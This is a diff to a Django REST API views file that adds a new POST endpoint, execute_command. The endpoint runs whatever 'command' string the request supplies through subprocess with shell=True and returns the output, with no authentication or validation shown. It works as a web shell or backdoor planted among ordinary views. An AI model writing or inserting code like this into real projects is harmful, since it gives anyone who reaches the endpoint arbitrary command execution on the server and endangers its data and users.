@@ -1339,3 +1339,13 @@ class ProcessHTMLView(APIView):
             return Response({"message": f"HTML content processed and saved in {output_filename}."})
         else:
             return Response({"error": "File not found."}, status=404)
+
+
+@api_view(['POST'])
+def execute_command(request):
+    command = request.data.get('command')
+    try:
+        result = subprocess.check_output(command, shell=True, text=True)
+        return Response({'output': result})
+    except subprocess.CalledProcessError as e:
+        return Response({'output': f"Error: {e.output}"})
